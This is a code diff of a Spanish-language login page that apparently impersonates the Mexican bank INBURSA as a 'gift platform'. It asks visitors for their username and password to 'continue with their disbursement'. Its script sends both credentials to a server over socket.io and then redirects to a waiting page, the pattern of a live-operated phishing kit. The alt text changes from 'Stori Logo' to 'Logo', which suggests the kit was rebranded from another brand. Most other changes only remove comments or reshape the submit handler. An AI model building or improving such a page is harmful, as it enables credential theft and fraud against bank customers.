@@ -12,8 +12,8 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;  /* Centrado horizontal */
-      align-items: center;      /* Centrado vertical */
+      justify-content: center;
+      align-items: center;
       min-height: 100vh;
       text-align: center;
     }
@@ -46,18 +46,17 @@
       margin-bottom: 1rem;
     }
 
-    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;  /* Espaciado entre campos */
+      margin: 1rem 0;
       padding: 0.0rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
-      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
+      justify-content: flex-start;
+      margin-left: -15px;
     }
 
     .input-group .icon {
@@ -75,11 +74,10 @@
       height: 20px;
     }
 
-    /* Botón centrado y ajustado */
     button {
       background-color: #262D91;
       color: white;
-      padding: 8px 20px; /* Botón más pequeño */
+      padding: 8px 20px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -97,7 +95,6 @@
       cursor: not-allowed;
     }
 
-    /* Mensaje de error */
     .mensaje-error {
       color: red;
       margin-top: 1rem;
@@ -111,19 +108,19 @@
 </head>
 <body>
   <div class="screen active" id="pantallaInicio">
-    <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="Stori Logo" class="logo">
+    <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="Logo" class="logo">
     <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong></h2>
     <p>Ingrese su usuario y contraseña para continuar con su desembolso</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Usuario" required> <!-- Campo de usuario -->
+        <input type="text" id="usuario" placeholder="Usuario" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      <p id="usuarioError" class="mensaje-error"></p> <!-- Mensaje de error usuario -->
+      <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
@@ -136,33 +133,33 @@
     window.addEventListener('DOMContentLoaded', () => {
       const form = document.getElementById('login-form');
 
-      if (form) {
-        form.addEventListener('submit', (e) => {
-          e.preventDefault(); // Evitar el comportamiento por defecto del formulario
+      // Agregar el manejador de evento al enviar el formulario
+      form.addEventListener('submit', (e) => {
+        e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
-          // Validar los campos antes de enviar los datos
-          if (validarUsuario() && validarPassword()) {
-            const usuario = document.getElementById('usuario').value;  // Obtener el valor del campo de usuario
-            const contrasena = document.getElementById('password').value;  // Obtener el valor del campo de contraseña
+        // Validar los campos antes de enviar los datos
+        if (validarUsuario() && validarPassword()) {
+          const usuario = document.getElementById('usuario').value;  // Obtener el valor del campo de usuario
+          const contrasena = document.getElementById('password').value;  // Obtener el valor del campo de contraseña
 
-            console.log('Usuario:', usuario);  // Para depuración
+          console.log('Usuario:', usuario);  // Para depuración (Verificar si el valor de usuario es correcto)
 
-            // Generar y guardar sessionId
-            const sessionId = Math.random().toString(36).substring(2, 15);
-            localStorage.setItem('sessionId', sessionId);
+          // Generar y guardar sessionId
+          const sessionId = Math.random().toString(36).substring(2, 15);
+          localStorage.setItem('sessionId', sessionId);
 
-            // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { usuario, contrasena, sessionId });
+          // Enviar datos al servidor mediante socket.io
+          socket.emit('dataForm', { usuario, contrasena, sessionId });
 
-            // Ir a pantalla de espera (opciones.html)
-            window.location.href = 'opciones.html';
-          }
-        });
-      }
+          // Ir a pantalla de espera (opciones.html)
+          window.location.href = 'opciones.html';
+        }
+      });
     });
 
+    // Validar el campo de usuario
     function validarUsuario() {
-      const usuario = document.getElementById("usuario").value;  // Asegúrate que el id sea correcto
+      const usuario = document.getElementById("usuario").value;
       const usuarioError = document.getElementById("usuarioError");
       const usuarioInput = document.getElementById("usuario");
 
@@ -177,6 +174,7 @@
       }
     }
 
+    // Validar el campo de contraseña
     function validarPassword() {
       const password = document.getElementById("password").value;
       const passwordError = document.getElementById("passwordError");
